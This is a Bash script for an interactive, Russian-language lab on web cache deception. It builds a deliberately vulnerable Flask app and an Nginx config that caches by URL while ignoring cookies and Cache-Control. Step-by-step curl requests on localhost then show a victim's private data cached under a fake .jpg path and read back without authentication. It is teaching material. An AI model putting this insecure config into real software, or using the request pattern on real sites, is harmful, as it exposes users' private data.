#!/bin/bash
# modules/wcd.sh

# === ЗАГРУЗКА НАСТРОЕК ===
if [[ -z "${PORT_BACKEND:-}" ]]; then
    if [[ -f ../settings ]]; then
        . ../settings
    else
        echo "❌ Файл settings не найден!"
        return 1
    fi
fi

# Если PORT_CACHE не задан в settings, используем значение по умолчанию
PORT_CACHE="${PORT_CACHE:-8080}"

source ./lib/stack.sh

module_run() {
    echo "═══════════════════════════════════════════════════════════════════════════════"
    echo "🔐 Web Cache Deception (Обман кэша) - Интерактивная демонстрация"
    echo "═══════════════════════════════════════════════════════════════════════════════"
    echo ""
    echo "📌 ЧТО ТАКОЕ ОБМАН КЭША (WCD)?"
    echo "   Это атака, при которой злоумышленник заставляет кэширующий прокси (Nginx)"
    echo "   сохранить приватные данные другого пользователя, а затем крадёт их."
    echo "   Термин 'отравление' (poisoning) — это другая атака. Здесь мы именно ОБМАНЫВАЕМ"
    echo "   кэш, заставляя его сохранить чужие данные как будто они статические."
    echo ""
    echo "═══════════════════════════════════════════════════════════════════════════════"
    echo "🏗️  СТЕНД:"
    echo "   • Flask (бэкенд) — порт ${PORT_BACKEND}, хранит приватные данные"
    echo "   • Nginx (кэширующий прокси) — порт ${PORT_CACHE}, кэширует .jpg/.css/.js"
    echo "   • Клиент (curl) — отправляет запросы"
    echo "═══════════════════════════════════════════════════════════════════════════════"
    echo ""

    # === СОЗДАЁМ app.py ===
    echo '[1/4] Создаём уязвимое Flask-приложение...'
    cat > /tmp/anatoly_project/app.py << EOF
from flask import Flask, request, jsonify

app = Flask(__name__)

@app.route("/my-account")
@app.route("/my-account/<path:whatever>")
def my_account(whatever=None):
    cookie_value = request.cookies.get("session")
    if cookie_value == "victim":
        return jsonify({
            "username": "anatoly",
            "role": "user",
            "api_key": "WCD_SECRET_42",
            "session_cookie": cookie_value
        })
    else:
        return jsonify({"error": "Unauthorized", "your_cookie": cookie_value}), 401

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=${PORT_BACKEND})

EOF
    echo "   ✅ Готово"
    echo ""

    # === СОЗДАЁМ nginx.conf ===
    echo '[2/4] Создаём уязвимый конфиг Nginx...'
    cat > /tmp/anatoly_project/nginx.conf << EOF
pid /tmp/anatoly_project/nginx.pid;

events {}

http {
    access_log /tmp/anatoly_project/nginx_access.log;
    error_log /tmp/anatoly_project/nginx_error.log;

    client_body_temp_path /tmp/anatoly_project/nginx_temp 1 2;
    proxy_temp_path /tmp/anatoly_project/nginx_proxy_temp;
    fastcgi_temp_path /tmp/anatoly_project/nginx_fastcgi_temp 1 2;

    proxy_cache_path /tmp/anatoly_project/cache levels=1:2 keys_zone=wcd_cache:10m max_size=100m inactive=60m;

    server {
        listen ${PORT_CACHE};

        location / {
            proxy_pass http://127.0.0.1:${PORT_BACKEND};
        }

        location ~* \.(jpg|css|js)$ {
            proxy_cache wcd_cache;
            proxy_cache_key "\$request_uri";
            proxy_pass http://127.0.0.1:${PORT_BACKEND};
            proxy_ignore_headers Cache-Control Set-Cookie;
            proxy_cache_valid 200 60m;
            add_header X-Cache-Status \$upstream_cache_status;
        }
    }
}
EOF
    echo "   ✅ Готово"
    echo ""

    # === ЗАПУСК СЕРВИСОВ ===
    echo '[3/4] Запуск сервисов...'
    start_flask "$PORT_BACKEND" "/tmp/anatoly_project/app.py"
    start_nginx "$PORT_CACHE" "/tmp/anatoly_project/nginx.conf"
    wait_for_port "$PORT_BACKEND"
    wait_for_port "$PORT_CACHE"
    echo "   ✅ Flask на порту ${PORT_BACKEND}, Nginx на порту ${PORT_CACHE}"
    echo ""

    echo "═══════════════════════════════════════════════════════════════════════════════"
    echo "🎯 ИНТЕРАКТИВНАЯ ДЕМОНСТРАЦИЯ АТАКИ"
    echo "═══════════════════════════════════════════════════════════════════════════════"
    echo ""

    # =========================================================================
    # 1. НЕАВТОРИЗОВАННЫЙ ДОСТУП (без куки)
    # =========================================================================
    echo "┌─────────────────────────────────────────────────────────────────────────────┐"
    echo "│ 1️⃣  НЕАВТОРИЗОВАННЫЙ ПОЛЬЗОВАТЕЛЬ (без куки)                               │"
    echo "└─────────────────────────────────────────────────────────────────────────────┘"
    echo ""
    echo "📡 ВЫПОЛНЯЕТСЯ ЗАПРОС:"
    echo "   curl -s http://localhost:${PORT_CACHE}/my-account"
    echo ""
    RESP1=$(curl -s http://localhost:${PORT_CACHE}/my-account)
    echo "📤 ОТВЕТ СЕРВЕРА:"
    echo "───────────────────────────────────────────────────────────────────────────────"
    echo "$RESP1"
    echo "───────────────────────────────────────────────────────────────────────────────"
    echo "❌ ДОСТУП ЗАПРЕЩЁН — сервер требует авторизацию"
    echo ""

    read -p "⏎ Нажми Enter, чтобы продолжить..."
    echo ""

    # =========================================================================
    # 2. АВТОРИЗОВАННЫЙ ДОСТУП (с кукой жертвы)
    # =========================================================================
    echo "┌─────────────────────────────────────────────────────────────────────────────┐"
    echo "│ 2️⃣  АВТОРИЗОВАННЫЙ ПОЛЬЗОВАТЕЛЬ (жертва с кукой session=victim)            │"
    echo "└─────────────────────────────────────────────────────────────────────────────┘"
    echo ""
    echo "📡 ВЫПОЛНЯЕТСЯ ЗАПРОС:"
    echo "   curl -s -b 'session=victim' http://localhost:${PORT_CACHE}/my-account"
    echo ""
    RESP2=$(curl -s -b "session=victim" http://localhost:${PORT_CACHE}/my-account)
    echo "📤 ОТВЕТ СЕРВЕРА:"
    echo "───────────────────────────────────────────────────────────────────────────────"
    echo "$RESP2"
    echo "───────────────────────────────────────────────────────────────────────────────"
    echo "✅ ДОСТУП РАЗРЕШЁН — возвращены приватные данные"
    echo "🔑 КУКА ЖЕРТВЫ: session=victim"
    echo ""

    read -p "⏎ Нажми Enter, чтобы продолжить..."
    echo ""

    # =========================================================================
    # 3. ОБМАН КЭША (запрос с кукой на .jpg)
    # =========================================================================
    echo "┌─────────────────────────────────────────────────────────────────────────────┐"
    echo "│ 3️⃣  ОБМАН КЭША (запрос с кукой жертвы на /my-account/test.jpg)            │"
    echo "└─────────────────────────────────────────────────────────────────────────────┘"
    echo ""
    echo "📡 ВЫПОЛНЯЕТСЯ ЗАПРОС:"
    echo "   curl -s -b 'session=victim' http://localhost:${PORT_CACHE}/my-account/test.jpg"
    echo ""
    echo '🔄 ПУТЬ ЗАПРОСА:'
    echo '   1. Клиент → Nginx (порт '"${PORT_CACHE}"'): /my-account/test.jpg'
    echo '   2. Nginx видит .jpg → решает кэшировать'
    echo '   3. Nginx → Flask (порт '"${PORT_BACKEND}"'): /my-account/test.jpg'
    echo '   4. Flask проверяет куку → данные приватные'
    echo '   5. Flask → Nginx: 200 OK, приватные данные'
    echo '   6. Nginx СОХРАНЯЕТ ОТВЕТ В КЭШ'
    echo ""
    RESP3=$(curl -s -b "session=victim" http://localhost:${PORT_CACHE}/my-account/test.jpg)
    echo "📤 ОТВЕТ СЕРВЕРА (сохранён в кэш):"
    echo "───────────────────────────────────────────────────────────────────────────────"
    echo "$RESP3"
    echo "───────────────────────────────────────────────────────────────────────────────"
    echo "✅ КЭШ ОБМАНУТ — приватные данные сохранены как статика .jpg"
    echo ""

    read -p "⏎ Нажми Enter, чтобы продолжить..."
    echo ""

    # =========================================================================
    # 4. КРАЖА ДАННЫХ ИЗ КЭША (запрос без куки)
    # =========================================================================
    echo "┌─────────────────────────────────────────────────────────────────────────────┐"
    echo "│ 4️⃣  КРАЖА ДАННЫХ ИЗ КЭША (запрос без куки на тот же URL)                  │"
    echo "└─────────────────────────────────────────────────────────────────────────────┘"
    echo ""
    echo "📡 ВЫПОЛНЯЕТСЯ ЗАПРОС:"
    echo "   curl -s http://localhost:${PORT_CACHE}/my-account/test.jpg"
    echo ""
    echo '🔄 ПУТЬ ЗАПРОСА:'
    echo '   1. Клиент → Nginx (порт '"${PORT_CACHE}"'): /my-account/test.jpg'
    echo '   2. Nginx видит .jpg → проверяет кэш по URL'
    echo '   3. КЭШ НЕ ПРОВЕРЯЕТ КУКИ — только URL'
    echo '   4. Nginx находит сохранённый ответ → ОТДАЁТ ИЗ КЭША'
    echo '   5. Flask даже не вызывается!'
    echo ""
    RESP4=$(curl -s http://localhost:${PORT_CACHE}/my-account/test.jpg)
    echo "📤 ОТВЕТ ИЗ КЭША:"
    echo "───────────────────────────────────────────────────────────────────────────────"
    echo "$RESP4"
    echo "───────────────────────────────────────────────────────────────────────────────"
    echo "🔓 ПРИВАТНЫЕ ДАННЫЕ УКРАДЕНЫ БЕЗ АВТОРИЗАЦИИ"
    echo ""

    # =========================================================================
    # ФИНАЛ
    # =========================================================================
    echo "═══════════════════════════════════════════════════════════════════════════════"
    echo "🎉 АТАКА УСПЕШНО ВЫПОЛНЕНА!"
    echo "═══════════════════════════════════════════════════════════════════════════════"
    echo ""
    echo '📊 СРАВНЕНИЕ ОТВЕТОВ:'
    echo "   • Запрос без куки (п.1):        ${RESP1}"
    echo "   • Запрос с кукой жертвы (п.2):  ${RESP2}"
    echo "   • Обман кэша (п.3):             ${RESP3}"
    echo "   • Кража из кэша (п.4):          ${RESP4}"
    echo ""
    echo '🔍 АНАЛИЗ:'
    if [ "${RESP3}" = "${RESP4}" ] && [ -n "${RESP3}" ]; then
        echo '   • Ответы п.2 и п.3 — одинаковые (приватные данные)'
        echo '   • Ответ п.4 — ТАКОЙ ЖЕ, как п.3, но получен БЕЗ КУКИ'
        echo '   • Значит, данные пришли из кэша, а не от бэкенда'
    else
        echo '   ⚠️ Ответ п.4 не совпадает с п.3. Проверь кэш Nginx.'
    fi
    echo ""
    echo '📖 ПОЧЕМУ ЭТО РАБОТАЕТ:'
    echo '   1. Nginx кэширует по URL, игнорируя куки'
    echo '   2. Flask отдаёт данные на /my-account/ЛЮБОЙ_ПУТЬ'
    echo '   3. Приватные данные жертвы попадают в общий кэш'
    echo '   4. Злоумышленник забирает их без авторизации'
    echo ""
    echo "═══════════════════════════════════════════════════════════════════════════════"
}